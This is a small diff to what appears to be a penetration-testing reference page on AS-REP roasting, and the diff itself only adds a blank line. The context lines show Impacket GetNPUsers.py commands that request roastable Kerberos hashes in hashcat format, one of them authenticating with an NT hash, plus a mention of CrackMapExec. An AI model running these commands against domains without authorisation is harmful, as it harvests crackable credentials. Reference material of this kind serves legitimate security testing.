@@ -34,6 +34,7 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $K
 
 # users list dynamically queried with a LDAP authenticated bind (NT hash)
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+
 ```
 
 This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).
